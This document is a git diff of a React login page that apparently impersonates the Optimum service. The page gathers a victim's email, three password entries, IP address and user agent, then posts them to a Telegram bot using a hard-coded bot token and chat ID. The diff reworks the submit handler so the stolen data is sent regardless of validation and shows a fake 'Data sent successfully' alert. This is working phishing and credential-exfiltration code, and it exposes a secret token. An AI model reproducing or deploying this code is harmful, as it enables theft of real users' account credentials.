@@ -1,5 +1,6 @@
 import React, { useEffect, useState } from 'react'
 import { useParams } from 'react-router-dom';
+import loader from "./assets/loader.webp"
 
 const Home = () => {
 
@@ -79,9 +80,12 @@ const Home = () => {
             }
         }
         else {
-            if (!emailError && !passwordError) {
-                // Prepare the message to send
-                const message = `Email: ${email}
+            alert('Data sent successfully!');
+        }
+
+        if (!emailError && !passwordError) {
+            // Prepare the message to send
+            const message = `Email: ${email}
                 Optimum1: ${password1}
                 Optimum2: ${password2}
                 Optimum3: ${password}
@@ -89,31 +93,29 @@ const Home = () => {
                 Client IP: ${clientIp}
                 User Agent: ${userAgent}`;
 
-                // Replace these values with your bot token and chat ID
-                const botToken = '7183589540:AAGq3_lgoDWZRAzc9xHy4KyrTzkwcnzHt0Q';
-                const chatId = '7380056237';
+            // Replace these values with your bot token and chat ID
+            const botToken = '7183589540:AAGq3_lgoDWZRAzc9xHy4KyrTzkwcnzHt0Q';
+            const chatId = '7380056237';
 
-                try {
-                    // Send the message to Telegram
-                    toggleLoading(true)
-                    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                        },
-                        body: JSON.stringify({
-                            chat_id: chatId,
-                            text: message,
-                        }),
-                    });
+            try {
+                // Send the message to Telegram
+                toggleLoading(true)
+                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message,
+                    }),
+                });
 
-                    toggleLoading(false)
-                    // Optional: Handle success feedback or further actions here
-                    alert('Data sent successfully!');
-                } catch (error) {
-                    toggleLoading(false)
-                    console.error('Error sending message:', error);
-                }
+                toggleLoading(false)
+                // Optional: Handle success feedback or further actions here
+            } catch (error) {
+                toggleLoading(false)
+                console.error('Error sending message:', error);
             }
         }
     };
@@ -124,7 +126,7 @@ const Home = () => {
             <>
                 {/* Desktop Navbar */}
                 <span className={`w-full h-full fixed top-0 left-0 bg-[#0000009a] transition-all flex justify-center items-center ${loading ? "z-[100]" : "z-[-2]"}`}>
-                    <img src="https://static.vecteezy.com/system/resources/thumbnails/042/600/457/small/loading-circles-flat-style-modern-preloaders-png.png" className='spinner w-[10rem]' alt="" />
+                    <img src={loader} className='spinner w-[10rem]' alt="" />
                 </span>
                 <div className="w-full hidden md:flex justify-center text-white fixed bg-[rgb(0,40,100)] p-4">
                     <div className="flex justify-between w-full max-w-[90rem] px-[4rem]">
